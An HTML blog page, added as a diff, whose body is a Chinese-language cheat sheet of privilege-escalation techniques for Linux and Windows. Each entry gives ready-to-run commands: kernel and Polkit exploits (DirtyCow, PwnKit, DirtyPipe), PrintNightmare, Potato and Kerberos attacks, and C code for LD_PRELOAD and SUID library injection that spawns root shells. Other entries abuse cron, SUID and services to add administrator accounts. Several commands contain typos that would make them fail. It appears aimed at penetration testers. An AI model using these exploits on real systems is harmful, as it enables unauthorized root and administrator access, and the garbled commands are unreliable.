@@ -1,0 +1,1520 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>提权手法收集 | Enderman_1's blog</title><meta name="author" content="Enderman_1"><meta name="copyright" content="Enderman_1"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="提权手法收集DirtyC0w域：No Local Admin: Yes 操作系统: Linux 类型:  0&#x2F;1 Exploit 方法: gcc -pthread c0w.c -o c0w; .&#x2F;c0w; passwd; id 批注：https:&#x2F;&#x2F;github.com&#x2F;firefart&#x2F;dirtycow CVE-2016-1531域：No Local Admin: Yes 操作系统: Linux">
+<meta property="og:type" content="article">
+<meta property="og:title" content="提权手法收集">
+<meta property="og:url" content="https://endermanneer.github.io/2024/01/22/%E5%B0%8F%E5%AF%84%E5%B7%A7/117%E7%A7%8D%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95/index.html">
+<meta property="og:site_name" content="Enderman_1&#39;s blog">
+<meta property="og:description" content="提权手法收集DirtyC0w域：No Local Admin: Yes 操作系统: Linux 类型:  0&#x2F;1 Exploit 方法: gcc -pthread c0w.c -o c0w; .&#x2F;c0w; passwd; id 批注：https:&#x2F;&#x2F;github.com&#x2F;firefart&#x2F;dirtycow CVE-2016-1531域：No Local Admin: Yes 操作系统: Linux">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/touxiang.jpg">
+<meta property="article:published_time" content="2024-01-22T04:19:38.677Z">
+<meta property="article:modified_time" content="2024-01-22T04:21:22.388Z">
+<meta property="article:author" content="Enderman_1">
+<meta property="article:tag" content="提权">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/touxiang.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://endermanneer.github.io/2024/01/22/%E5%B0%8F%E5%AF%84%E5%B7%A7/117%E7%A7%8D%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '提权手法收集',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-01-22 12:21:22'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.2"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/touxiang.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">63</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">25</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">54</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Enderman_1's blog"><span class="site-name">Enderman_1's blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">提权手法收集</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-01-22T04:19:38.677Z" title="发表于 2024-01-22 12:19:38">2024-01-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-01-22T04:21:22.388Z" title="更新于 2024-01-22 12:21:22">2024-01-22</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%B0%8F%E5%AF%84%E5%B7%A7/">小寄巧</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%B0%8F%E5%AF%84%E5%B7%A7/%E6%8F%90%E6%9D%83/">提权</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="提权手法收集"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="提权手法收集"><a href="#提权手法收集" class="headerlink" title="提权手法收集"></a>提权手法收集</h1><h3 id="DirtyC0w"><a href="#DirtyC0w" class="headerlink" title="DirtyC0w"></a>DirtyC0w</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Linux</p>
+<p>类型:  0/1 Exploit</p>
+<p>方法: <code>gcc -pthread c0w.c -o c0w; ./c0w; passwd; id</code></p>
+<p>批注：<a target="_blank" rel="noopener" href="https://github.com/firefart/dirtycow">https://github.com/firefart/dirtycow</a></p>
+<h3 id="CVE-2016-1531"><a href="#CVE-2016-1531" class="headerlink" title="CVE-2016-1531"></a>CVE-2016-1531</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Linux</p>
+<p>类型:  0/1 Exploit</p>
+<p>方法: <code>CVE-2016-1531.sh;id</code></p>
+<p>批注：<a target="_blank" rel="noopener" href="https://github.com/crypticdante/CVE-2016-1531">https://github.com/crypticdante/CVE-2016-1531</a></p>
+<h3 id="Polkit"><a href="#Polkit" class="headerlink" title="Polkit"></a>Polkit</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Linux</p>
+<p>类型:  0/1 Exploit</p>
+<p>方法:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation</span><br><span class="line">./2. poc.sh</span><br></pre></td></tr></table></figure>
+
+<h3 id="DirtyPipe"><a href="#DirtyPipe" class="headerlink" title="DirtyPipe"></a>DirtyPipe</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Linux</p>
+<p>类型:  0/1 Exploit</p>
+<p>方法:</p>
+<ol>
+<li><code>./traitor-amd64 –exploit kernel:CVE-2022-0847</code></li>
+<li><code>Whoami;id</code></li>
+</ol>
+<p>批注：<a target="_blank" rel="noopener" href="https://github.com/liamg/traitor/releases/tag/v0.0.14">https://github.com/liamg/traitor/releases/tag/v0.0.14</a></p>
+<h3 id="PwnKit"><a href="#PwnKit" class="headerlink" title="PwnKit"></a>PwnKit</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Linux</p>
+<p>类型:  0/1 Exploit</p>
+<p>方法:</p>
+<ol>
+<li><code>./cve-2021-4034</code></li>
+<li><code>Whoami;id</code></li>
+</ol>
+<p>批注：<a target="_blank" rel="noopener" href="https://github.com/berdav/CVE-2021-4034">https://github.com/berdav/CVE-2021-4034</a></p>
+<h3 id="ms14-058"><a href="#ms14-058" class="headerlink" title="ms14_058"></a>ms14_058</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  0/1 Exploit</p>
+<p>方法:</p>
+<ul>
+<li><code>msf &gt; use exploit/windows/local/ms14_058_track_popup_menu</code></li>
+<li><code>msf exploit(ms14_058_track_popup_menu) &gt; set TARGET &lt; target-id &gt;</code></li>
+<li><code>msf exploit(ms14_058_track_popup_menu) &gt; exploit</code></li>
+</ul>
+<h3 id="Hot-Potato"><a href="#Hot-Potato" class="headerlink" title="Hot Potato"></a>Hot Potato</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  0/1 Exploit</p>
+<p>方法:</p>
+<ol>
+<li>命令提示符下: <code>powershell.exe -nop -ep bypass</code></li>
+<li>在Power Shell提示符类型输入: <code>Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1</code></li>
+<li>在Power Shell提示符类型输入: <code>Invoke-Tater -Trigger 1 -Command “net localgroup administrators user /add”</code></li>
+<li>要确认攻击是否成功，请在 Power Shell 提示符中键入: <code>net localgroup administrators</code></li>
+</ol>
+<p>批注：<a target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Tater">https://github.com/Kevin-Robertson/Tater</a></p>
+<h3 id="Intel-SYSRET"><a href="#Intel-SYSRET" class="headerlink" title="Intel SYSRET"></a>Intel SYSRET</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  0/1 Exploit</p>
+<p>方法:</p>
+<ol>
+<li><code>execute -H -f sysret.exe -a &quot;-pid [pid]&quot;</code></li>
+</ol>
+<p>批注：<a target="_blank" rel="noopener" href="https://github.com/jajp777/sysret">https://github.com/jajp777/sysret</a></p>
+<p>release版本：<a target="_blank" rel="noopener" href="https://github.com/jajp777/sysret/tree/master/x64/Release">https://github.com/jajp777/sysret/tree/master/x64/Release</a></p>
+<h3 id="PrintNightmare"><a href="#PrintNightmare" class="headerlink" title="PrintNightmare"></a>PrintNightmare</h3><p>域：Yes</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  0/1 Exploit</p>
+<p>方法:</p>
+<p>1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/outflanknl/PrintNightmare</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><code>PrintNightmare 10.10.10.10 exp.dll</code></li>
+</ol>
+<h3 id="Folina"><a href="#Folina" class="headerlink" title="Folina"></a>Folina</h3><p>域名: Y/N</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  0/1 Exploit</p>
+<p>方法:</p>
+<p>1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/JohnHammond/msdt-follina</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><code>python3 follina.py -c &quot;notepad&quot;</code></li>
+</ol>
+<h3 id="ALPC"><a href="#ALPC" class="headerlink" title="ALPC"></a>ALPC</h3><p>域名: Y/N</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  0/1 Exploit</p>
+<p>方法:</p>
+<p>1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/riparino/Task_Scheduler_ALPC</span><br></pre></td></tr></table></figure>
+
+<h3 id="RemotePotato0"><a href="#RemotePotato0" class="headerlink" title="RemotePotato0"></a>RemotePotato0</h3><p>域名: Y/N</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  0/1 Exploit</p>
+<p>方法:</p>
+<ol>
+<li><code>sudo ntlmrelayx.py -t ldap://10.0.0.10 –no-wcf-server –escalate-user normal_user</code></li>
+<li><code>.\RemotePotato0.exe -m 0 -r 10.0.0.20 -x 10.0.0.20 -p 9999 -s 1</code></li>
+</ol>
+<p>批注：</p>
+<p>ntlmrelayx.py只找到个很相似的：<a target="_blank" rel="noopener" href="https://github.com/LuemmelSec/ntlmrelayx.py_to_exe">https://github.com/LuemmelSec/ntlmrelayx.py_to_exe</a></p>
+<p>remotepotato：<a target="_blank" rel="noopener" href="https://github.com/antonioCoco/RemotePotato0/releases/tag/1.2">https://github.com/antonioCoco/RemotePotato0/releases/tag/1.2</a></p>
+<h3 id="CVE-2022-26923"><a href="#CVE-2022-26923" class="headerlink" title="CVE-2022-26923"></a>CVE-2022-26923</h3><p>域名: Y/N</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  0/1 Exploit</p>
+<p>方法:</p>
+<ol>
+<li><code>certipy req ‘lab.local/cve$:CVEPassword1234*@10.100.10.13’ -template Machine -dc-ip 10.10.10.10 -ca lab-ADCS-CA</code></li>
+<li><code>Rubeus.exe asktgt /user:&quot;目标_sam名称&quot; /certificate:cert.pfx /password:&quot;CERTIFICATE_PASSWORD&quot; /domain:&quot;FQDN_域名&quot; /dc:&quot;域名_CONTROLLER&quot; /show</code></li>
+</ol>
+<p>批注：</p>
+<p>rubeus：<a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a></p>
+<h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><p>域名: Y/N</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  0/1 Exploit</p>
+<p>方法:</p>
+<ol>
+<li><code>python ms14-068.py -u user-a-1@dom-a.loc -s S-1-5-21-557603841-771695929-1514560438-1103 -d dc-a-2003.dom-a.loc</code></li>
+</ol>
+<p>批注：</p>
+<p>无py版本，exe版本：<a target="_blank" rel="noopener" href="https://github.com/ianxtianxt/MS14-068">https://github.com/ianxtianxt/MS14-068</a></p>
+<h3 id="Sudo-LD-PRELOAD"><a href="#Sudo-LD-PRELOAD" class="headerlink" title="Sudo LD_PRELOAD"></a>Sudo LD_PRELOAD</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Linux</p>
+<p>类型:  Injection</p>
+<p>方法:</p>
+<ol>
+<li></li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> _init() &#123;</span><br><span class="line">unsetenv(“LD_PRELOAD”);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    system(“/bin/bash”);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><code>gcc -fPIC -shared -o /tmp/ldreload.so ldreload.c -nostartfiles</code></li>
+<li><code>sudo LD_RELOAD=tmp/ldreload.so apache2</code></li>
+</ol>
+<h3 id="Abusing-File-Permission-via-SUID-Binaries-–-so-injection"><a href="#Abusing-File-Permission-via-SUID-Binaries-–-so-injection" class="headerlink" title="Abusing File Permission via SUID Binaries – .so injection)"></a>Abusing File Permission via SUID Binaries – .so injection)</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Linux</p>
+<p>类型:  Injection</p>
+<p>方法:</p>
+<ol>
+<li><code>mkdir /home/user/.config</code></li>
+<li></li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">inject</span><span class="params">()</span> _attribute _<span class="params">((constructor))</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">inject</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"> system(“cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p”);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><code>gcc -shared -o /home/user/.config/libcalc.so -fPIC/home/user/.config/libcalc.c</code></li>
+<li><code>/usr/local/bin/suid-so</code></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id</span><br></pre></td></tr></table></figure>
+
+<h3 id="DLL-Injection"><a href="#DLL-Injection" class="headerlink" title="DLL Injection"></a>DLL Injection</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Injection</p>
+<p>方法:</p>
+<ol>
+<li><code>RemoteDLLInjector64</code></li>
+</ol>
+<p>Or</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MemJect</span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/tomcarver16/BOF-DLL-Inject</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><code>#define PROCESS_NAME &quot;csgo.exe&quot;</code></li>
+</ol>
+<p>Or</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RemoteDLLInjector64.exe pid C:\runforpriv.dll</span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mandllinjection ./runforpriv.dll pid</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>批注：</p>
+<p>remoteDllInjector：<a target="_blank" rel="noopener" href="https://github.com/Al1ex/RemoteDLLInjector">https://github.com/Al1ex/RemoteDLLInjector</a></p>
+<p>memject：<a target="_blank" rel="noopener" href="https://github.com/danielkrupinski/MemJect">https://github.com/danielkrupinski/MemJect</a></p>
+<h3 id="Early-Bird-Injection"><a href="#Early-Bird-Injection" class="headerlink" title="Early Bird Injection"></a>Early Bird Injection</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Injection</p>
+<p>方法:</p>
+<p>1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hollow svchost.exe pop.bin</span><br></pre></td></tr></table></figure>
+
+
+
+<p>批注：hollow链接<a target="_blank" rel="noopener" href="https://github.com/m0n0ph1/Process-Hollowing">https://github.com/m0n0ph1/Process-Hollowing</a></p>
+<h3 id="Process-Injection-through-Memory-Section"><a href="#Process-Injection-through-Memory-Section" class="headerlink" title="Process Injection through Memory Section"></a>Process Injection through Memory Section</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Injection</p>
+<p>方法:</p>
+<ol>
+<li><code>sec-shinject PID /path/to/bin</code></li>
+</ol>
+<p>批注：未找到</p>
+<h3 id="Abusing-Scheduled-Tasks-via-Cron-Path-Overwrite"><a href="#Abusing-Scheduled-Tasks-via-Cron-Path-Overwrite" class="headerlink" title="Abusing Scheduled Tasks via Cron Path Overwrite"></a>Abusing Scheduled Tasks via Cron Path Overwrite</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Linux</p>
+<p>类型:  Abusing Scheduled Tasks</p>
+<p>方法:</p>
+<ol>
+<li><code>echo &#39;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#39; &gt; systemupdate.sh;</code></li>
+<li><code>chmod +x systemupdate.sh</code></li>
+<li><code>等待一会儿</code></li>
+<li><code>/tmp/bash -p</code></li>
+<li><code>id &amp;&amp; whoami</code></li>
+</ol>
+<h3 id="Abusing-Scheduled-Tasks-via-Cron-Wildcards"><a href="#Abusing-Scheduled-Tasks-via-Cron-Wildcards" class="headerlink" title="Abusing Scheduled Tasks via Cron Wildcards"></a>Abusing Scheduled Tasks via Cron Wildcards</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Linux</p>
+<p>类型:  Abusing Scheduled Tasks</p>
+<p>方法:</p>
+<ol>
+<li><code>echo &#39;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#39; &gt; /home/user/systemupdate.sh;</code></li>
+<li><code>touch /home/user/ –checkpoint=1;</code></li>
+<li><code>touch /home/user/ –checkpoint-action=exec=sh\systemupdate.sh</code></li>
+<li><code>等待一会儿</code></li>
+<li><code>/tmp/bash -p</code></li>
+<li><code>id &amp;&amp; whoami</code></li>
+</ol>
+<h3 id="Abusing-File-Permission-via-SUID-Binaries-–-Symlink"><a href="#Abusing-File-Permission-via-SUID-Binaries-–-Symlink" class="headerlink" title="Abusing File Permission via SUID Binaries – Symlink)"></a>Abusing File Permission via SUID Binaries – Symlink)</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Linux</p>
+<p>类型:  Abusing File Permission</p>
+<p>方法:</p>
+<ol>
+<li><code>su – www-data;</code></li>
+<li><code>nginxed-root.sh /var/log/nginx/error.log;</code></li>
+<li>In root user</li>
+<li><code>invoke-rc.d nginx rotate &gt;/dev/null 2&gt;&amp;1</code></li>
+</ol>
+<h3 id="Abusing-File-Permission-via-SUID-Binaries-–-Environment-Variables-1"><a href="#Abusing-File-Permission-via-SUID-Binaries-–-Environment-Variables-1" class="headerlink" title="Abusing File Permission via SUID Binaries – Environment Variables #1)"></a>Abusing File Permission via SUID Binaries – Environment Variables #1)</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Linux</p>
+<p>类型:  Abusing File Permission</p>
+<p>方法:</p>
+<ol>
+<li><code>echo &#39;int main() &#123; setgid(0); setuid(0); system(&quot;/bin/bash&quot;); return 0; &#125;&#39; &gt;/tmp/service.c;</code></li>
+<li><code>gcc /tmp/services.c -o /tmp/service;</code></li>
+<li><code>export PATH=/tmp:$PATH;</code></li>
+<li><code>/usr/local/bin/sudi-env; id</code></li>
+</ol>
+<h3 id="Abusing-File-Permission-via-SUID-Binaries-–-Environment-Variables-2"><a href="#Abusing-File-Permission-via-SUID-Binaries-–-Environment-Variables-2" class="headerlink" title="Abusing File Permission via SUID Binaries – Environment Variables #2)"></a>Abusing File Permission via SUID Binaries – Environment Variables #2)</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Linux</p>
+<p>类型:  Abusing File Permission</p>
+<p>方法:</p>
+<ol>
+<li><code>env -i SHELLOPTS=xtrace PS4=&#39;$(cp /bin/bash /tmp &amp;&amp; chown root.root /tmp/bash &amp;&amp; chmod +S /tmp/bash)&#39; /bin/sh -c /usr/local/bin/suid-env2; set +x; /tmp/bash -p</code></li>
+</ol>
+<h3 id="DLL-Hijacking"><a href="#DLL-Hijacking" class="headerlink" title="DLL Hijacking"></a>DLL Hijacking</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Abuse Privilege</p>
+<p>方法:</p>
+<ol>
+<li><code>Windows_dll.c: cmd.exe /k net localgroup administrators user /add</code></li>
+<li><code>x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll</code></li>
+<li><code>sc stop dllsvc &amp; sc start dllsvc</code></li>
+</ol>
+<h3 id="Abusing-Services-via-binPath"><a href="#Abusing-Services-via-binPath" class="headerlink" title="Abusing Services via binPath"></a>Abusing Services via binPath</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Abuse Privilege</p>
+<p>方法:</p>
+<ol>
+<li><code>sc config daclsvc binpath= &quot;net localgroup administrators user /add&quot;</code></li>
+<li><code>sc start daclsvc</code></li>
+</ol>
+<h3 id="Abusing-Services-via-Unquoted-Path"><a href="#Abusing-Services-via-Unquoted-Path" class="headerlink" title="Abusing Services via Unquoted Path"></a>Abusing Services via Unquoted Path</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Abuse Privilege</p>
+<p>方法:</p>
+<ol>
+<li><code>msfvenom -p windows/exec CMD=’net localgroup administrators user /add’ -f exe-service -o common.exe</code></li>
+<li><code>common.exe 放在 &#39;C:\Program Files\Unquoted Path Service&#39;.</code></li>
+<li><code>sc start unquotedsvc</code></li>
+</ol>
